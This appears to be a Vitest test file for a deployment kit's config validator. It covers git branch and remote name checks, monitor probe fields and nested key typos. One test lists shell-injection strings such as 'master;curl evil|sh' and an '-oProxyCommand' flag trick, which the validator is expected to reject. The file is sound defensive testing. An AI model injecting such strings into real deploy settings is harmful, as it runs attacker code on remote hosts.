import { describe, it, expect } from 'vitest';
import { createRequire } from 'module';

const require = createRequire(__filename);
const kit = require('../index.js') as typeof import('../index');
const { validateConfig } = kit;

// PKG-82: these guards existed only for keys that were already validated
// (projectDir, sharedPaths, monitor probe url/headers). This file targets the
// three gaps that had NO coverage at all — a guard nobody has watched fail is
// decoration. Every case below both rejects the bad input (asserting on the
// specific message) and accepts the legitimate input (no false positives).

describe('config validation: branch/remote charset (shell-injection guard)', () => {
  // git pull --ff-only ${remote} ${branch} in deploy.js interpolates both
  // UNQUOTED into a command run on the target host over ssh.
  const shellPayloads = [
    'master;curl evil|sh',
    'master`curl evil|sh`',
    'master$(curl evil|sh)',
    'master && curl evil | sh',
    '-oProxyCommand=curl evil|sh', // leading "-" read as a flag by git
  ];

  it.each(shellPayloads)('rejects a branch containing shell metacharacters: %s', (bad) => {
    const problems = validateConfig({ branch: bad });
    expect(problems.join('\n')).toMatch(/"branch".*must be a valid git ref name/);
  });

  it.each(shellPayloads)('rejects a remote containing shell metacharacters: %s', (bad) => {
    const problems = validateConfig({ remote: bad });
    expect(problems.join('\n')).toMatch(/"remote".*must be a valid git ref name/);
  });

  it('rejects ".." and a trailing "/" in a branch name', () => {
    expect(validateConfig({ branch: 'feature/../etc' }).join()).toMatch(/"branch".*must be a valid git ref name/);
    expect(validateConfig({ branch: 'feature/' }).join()).toMatch(/"branch".*must be a valid git ref name/);
  });

  it('accepts legitimate branch names with no false positives', () => {
    expect(validateConfig({ branch: 'feature/foo-bar_1.2' })).toEqual([]);
    expect(validateConfig({ branch: 'release/v1.0' })).toEqual([]);
    expect(validateConfig({ branch: 'master' })).toEqual([]);
    expect(validateConfig({ branch: 'main' })).toEqual([]);
  });

  it('accepts a null branch (default: resolve origin/HEAD)', () => {
    expect(validateConfig({ branch: null })).toEqual([]);
  });

  it('accepts a legitimate remote name with no false positives', () => {
    expect(validateConfig({ remote: 'origin' })).toEqual([]);
    expect(validateConfig({ remote: 'upstream' })).toEqual([]);
  });
});

describe('config validation: monitor.publicProbes sub-fields', () => {
  const withProbe = (probe: any) => validateConfig({
    monitor: { alert: { command: 'notify' }, publicProbes: [{ id: 'api', url: 'https://app/health', ...probe }] },
  });

  it('rejects a non-numeric expectStatus', () => {
    expect(withProbe({ expectStatus: 'ok' }).join()).toMatch(/expectStatus must be an HTTP status code/);
  });

  it('rejects an out-of-range expectStatus', () => {
    expect(withProbe({ expectStatus: 99 }).join()).toMatch(/expectStatus must be an HTTP status code/);
    expect(withProbe({ expectStatus: 600 }).join()).toMatch(/expectStatus must be an HTTP status code/);
  });

  it('rejects an expectStatus array containing a bad entry', () => {
    expect(withProbe({ expectStatus: [200, 'nope'] }).join()).toMatch(/expectStatus must be an HTTP status code/);
  });

  it('rejects an empty expectStatus array', () => {
    expect(withProbe({ expectStatus: [] }).join()).toMatch(/expectStatus must be an HTTP status code/);
  });

  it('accepts a valid single or array expectStatus', () => {
    expect(withProbe({ expectStatus: 200 })).toEqual([]);
    expect(withProbe({ expectStatus: [200, 201, 204] })).toEqual([]);
  });

  it('rejects a non-string expectBodyIncludes', () => {
    expect(withProbe({ expectBodyIncludes: 42 }).join()).toMatch(/expectBodyIncludes must be a non-empty string/);
  });

  it('rejects an empty expectBodyIncludes', () => {
    expect(withProbe({ expectBodyIncludes: '' }).join()).toMatch(/expectBodyIncludes must be a non-empty string/);
  });

  it('accepts a valid expectBodyIncludes', () => {
    expect(withProbe({ expectBodyIncludes: '"status":"ok"' })).toEqual([]);
  });

  it('rejects a non-positive maxTimeSeconds', () => {
    expect(withProbe({ maxTimeSeconds: 0 }).join()).toMatch(/maxTimeSeconds must be a positive number/);
    expect(withProbe({ maxTimeSeconds: -5 }).join()).toMatch(/maxTimeSeconds must be a positive number/);
    expect(withProbe({ maxTimeSeconds: 'fast' }).join()).toMatch(/maxTimeSeconds must be a positive number/);
  });

  it('accepts a valid maxTimeSeconds', () => {
    expect(withProbe({ maxTimeSeconds: 5 })).toEqual([]);
  });

  it('accepts a fully valid probe with all optional sub-fields set', () => {
    expect(withProbe({ expectStatus: [200, 204], expectBodyIncludes: 'ok', maxTimeSeconds: 8 })).toEqual([]);
  });
});

describe('config validation: deliveryEvent inner shape', () => {
  it('rejects an unknown key (the "comand" typo this gap was found from)', () => {
    const problems = validateConfig({ deliveryEvent: { comand: 'npm run notify' } });
    expect(problems.join('\n')).toMatch(/unknown deliveryEvent key "comand"/);
    expect(problems.join('\n')).toMatch(/"deliveryEvent.command" must be a non-empty string/);
  });

  it('rejects a missing command', () => {
    expect(validateConfig({ deliveryEvent: {} }).join()).toMatch(/"deliveryEvent.command" must be a non-empty string/);
  });

  it('rejects an empty-string command', () => {
    expect(validateConfig({ deliveryEvent: { command: '   ' } }).join()).toMatch(/"deliveryEvent.command" must be a non-empty string/);
  });

  it('accepts a valid deliveryEvent', () => {
    expect(validateConfig({ deliveryEvent: { command: 'npx deploy-kit announce-discord' } })).toEqual([]);
  });

  it('accepts a null deliveryEvent (disabled, the default)', () => {
    expect(validateConfig({ deliveryEvent: null })).toEqual([]);
  });
});

describe('config validation: release-layout post-deploy failure policy', () => {
  const layout = { type: 'releases' };
  const check = { name: 'public-smoke', command: 'run-smoke' };

  it('requires every release-layout post-deploy check to choose a policy', () => {
    expect(validateConfig({ layout, postDeployChecks: [check] }).join('\n'))
      .toMatch(/postDeployChecks\[0\]\.onFailure is required/);
  });

  it.each(['rollback', 'remain-active', 'manual'])('accepts %s', (onFailure) => {
    expect(validateConfig({ layout, postDeployChecks: [{ ...check, onFailure }] })).toEqual([]);
  });

  it('rejects unknown policies and typoed check keys', () => {
    const problems = validateConfig({
      layout,
      postDeployChecks: [{ ...check, onFailure: 'ignore', onFailuer: 'rollback' }],
    }).join('\n');
    expect(problems).toMatch(/onFailure must be/);
    expect(problems).toMatch(/unknown postDeployChecks\[0\] key "onFailuer"/);
  });

  it('preserves the legacy layout behavior when no policy is supplied', () => {
    expect(validateConfig({ postDeployChecks: [check] })).toEqual([]);
  });
});

// PKG-135 Finding 6: `validateConfig` only ever allowlisted TOP-LEVEL keys and
// type-checked each nested block as a whole ('object') — never its CONTENTS.
// "hooks.migarte" validated fine, was never read by deploy.js, and silently
// left "hooks.migrate" (the real key) at its default (disabled) — exactly the
// kind of thing an operator discovers mid-incident. `health`, `ssh`, and
// monitor's own sub-blocks (disk/backup/restartStorm/alert) had the identical
// gap. Every case below both rejects the typo (by exact key name) AND — the
// over-rejection risk this fix could easily get wrong — accepts every
// LEGITIMATE documented key with no false positive.
describe('config validation: nested key allowlisting (PKG-135 Finding 6)', () => {
  it('rejects "hooks.migarte" (the exact typo this gap was found from), naming the bad key', () => {
    const problems = validateConfig({ hooks: { migarte: 'npm run db:migrate' } });
    expect(problems.join('\n')).toMatch(/unknown hooks key "migarte"/);
  });

  it('rejects a typo in "health" (attemtps for attempts)', () => {
    const problems = validateConfig({ health: { attemtps: 5 } });
    expect(problems.join('\n')).toMatch(/unknown health key "attemtps"/);
  });

  it('rejects a typo in "ssh" (connecTimeout for connectTimeout)', () => {
    const problems = validateConfig({ ssh: { connecTimeout: 10 } });
    expect(problems.join('\n')).toMatch(/unknown ssh key "connecTimeout"/);
  });

  it('rejects a typo in a monitor sub-object ("ruun" for monitor.alert.run)', () => {
    const problems = validateConfig({
      monitor: { alert: { command: 'notify', ruun: 'target' } },
    });
    expect(problems.join('\n')).toMatch(/unknown monitor\.alert key "ruun"/);
  });

  it('rejects a typo in monitor.disk and monitor.backup and monitor.restartStorm', () => {
    const disk = validateConfig({ monitor: { alert: { command: 'x' }, disk: { minFreKiB: 1 } } });
    expect(disk.join('\n')).toMatch(/unknown monitor\.disk key "minFreKiB"/);
    const backup = validateConfig({
      monitor: { alert: { command: 'x' }, backup: { stampFile: '/var/lib/x', maxAgeHors: 30 } },
    });
    expect(backup.join('\n')).toMatch(/unknown monitor\.backup key "maxAgeHors"/);
    const storm = validateConfig({
      monitor: { alert: { command: 'x' }, restartStorm: { maxDetla: 3 } },
    });
    expect(storm.join('\n')).toMatch(/unknown monitor\.restartStorm key "maxDetla"/);
  });

  it('rejects a non-nullable hooks.install typed wrong (a number instead of a string)', () => {
    const problems = validateConfig({ hooks: { install: 42 as unknown as string } });
    expect(problems.join('\n')).toMatch(/"hooks\.install" must be string/);
  });

  it('rejects hooks.install: null (unlike the other hooks, install is not optional — deploy.js always runs it)', () => {
    const problems = validateConfig({ hooks: { install: null as unknown as string } });
    expect(problems.join('\n')).toMatch(/"hooks\.install" must be string/);
  });

  // The over-rejection risk: every documented nested key, across every block
  // this fix touches, loaded together in one config. If the allowlist is
  // missing a real key (typed the schema wrong), this is the test that catches
  // it — a `.toEqual([])` on a fully-populated, real-shaped config is the same
  // bar the pre-existing "accepts a fully-specified valid monitor block" test
  // already holds itself to.
  it('accepts every documented hooks/health/ssh/monitor key with no false positive', () => {
    const problems = validateConfig({
      host: 'app@pi', projectDir: '/srv/app', appNames: ['app'],
      hooks: {
        install: 'npm ci', generate: 'npx prisma generate', backup: 'npm run backup',
        migrate: 'npm run migrate', build: 'npm run build', restart: 'pm2 restart app',
        restore: 'npm run restore',
      },
      health: { attempts: 30, delaySeconds: 2 },
      ssh: {
        connectTimeout: 10, serverAliveInterval: 15, serverAliveCountMax: 3,
        options: ['ProxyCommand=none'], strictHostKeyChecking: 'accept-new', batchMode: 'yes',
      },
      layout: {
        type: 'releases', keepReleases: 4, sharedPaths: ['.env'],
        releaseChecks: [{ name: 'prisma-client-loads', command: 'node -e "require(\'@prisma/client\')"' }],
        runningShaCommand: 'curl -s localhost:3000/health',
      },
      monitor: {
        disk: { minFreeKiB: 524288, minFreeInodes: 10000 },
        backup: { id: 'db', stampFile: '/var/lib/app/.last-success', maxAgeHours: 30 },
        restartStorm: { maxDelta: 3 },
        tunnel: true,
        publicProbes: [{ id: 'api', url: 'https://app.example.com/health', expectStatus: 200 }],
        checks: [{ id: 'providers', command: 'curl -sf localhost:3002/ready', level: 'warn' }],
        alert: { command: 'curl -sf -d @- https://app/notify', run: 'controller' },
        failAfterRuns: 2, recoverAfterRuns: 2, reAlertAfterMinutes: 15,
        stateFile: '/var/lib/app/deploy-kit-monitor-state.json',
        checkTimeoutSeconds: 20,
      },
      deliveryEvent: { command: 'npx deploy-kit announce-discord' },
    });
    expect(problems).toEqual([]);
  });

  // A partial override of any block (a real, common shape: a consumer only
  // sets the ONE hook/health/ssh field it cares about, relying on defaults for
  // the rest) must not be flagged as "missing" a key — validation only checks
  // keys that are actually present.
  it('accepts a partial override of hooks/health/ssh (only some keys set)', () => {
    expect(validateConfig({ hooks: { migrate: 'npm run migrate' } })).toEqual([]);
    expect(validateConfig({ health: { attempts: 10 } })).toEqual([]);
    expect(validateConfig({ ssh: { connectTimeout: null } })).toEqual([]);
    expect(validateConfig({ hooks: {} })).toEqual([]);
    expect(validateConfig({})).toEqual([]);
  });

  // The over-rejection risk, part 2: blocks that legitimately accept
  // ARBITRARY user-defined keys (the key IS user data — an HTTP header name —
  // not a fixed config field) must stay open. Neither of these went through
  // the new key-allowlist mechanism; confirm a header name that would never
  // appear in any allowlist still loads clean.
  it('leaves healthHeaders and monitor.publicProbes[].headers open to ARBITRARY keys (not tightened)', () => {
    const problems = validateConfig({
      healthHeaders: { 'X-Forwarded-Proto': 'https', 'X-Whatever-Header-I-Want': 'yes' },
      monitor: {
        alert: { command: 'x' },
        publicProbes: [{
          id: 'api', url: 'https://app/health',
          headers: { Authorization: 'Bearer xyz', 'X-Another-Custom-Header': '1' },
        }],
      },
    });
    expect(problems).toEqual([]);
  });
});
